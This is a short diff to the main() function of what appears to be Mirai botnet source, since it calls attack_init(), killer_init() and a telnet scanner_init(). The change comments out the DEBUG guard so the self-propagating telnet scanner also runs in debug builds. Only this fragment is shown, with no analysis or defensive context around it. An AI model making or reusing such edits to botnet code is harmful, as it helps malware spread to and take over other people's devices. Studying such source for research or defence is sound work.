@@ -155,11 +155,11 @@ int main(int argc, char **args)
 
     attack_init();
     killer_init();
-#ifndef DEBUG
+//#ifndef DEBUG
 #ifdef MIRAI_TELNET
     scanner_init();
 #endif
-#endif
+//#endif
 
     while (TRUE)
     {
